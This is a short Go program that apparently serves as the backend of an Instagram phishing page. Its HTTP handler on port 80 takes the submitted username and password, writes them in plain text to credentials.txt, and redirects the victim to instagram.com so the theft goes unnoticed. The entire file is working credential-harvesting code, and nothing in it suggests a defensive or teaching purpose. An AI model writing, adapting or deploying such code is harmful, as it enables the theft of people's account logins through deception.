package main

import (
	"fmt"
	"net/http"
	"os"
)

func saveCredentials(username, password string) {
	// Open the file in append mode
	file, err := os.OpenFile("credentials.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	// Write the username and password to the file
	data := fmt.Sprintf("Username: %s\nPassword: %s\n\n", username, password)
	_, err = file.WriteString(data)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("Username and password saved successfully")
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	username := r.PostFormValue("u_name")
	password := r.PostFormValue("pass")

	if username != "" && len(username) >= 1 && password != "" {
		saveCredentials(username, password)

		http.Redirect(w, r, "https://www.instagram.com", http.StatusSeeOther)
	} else {
		fmt.Println("Please enter correct username or password. Try again")
		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}

func main() {
	http.HandleFunc("/", loginHandler)
	http.ListenAndServe(":80", nil)
}
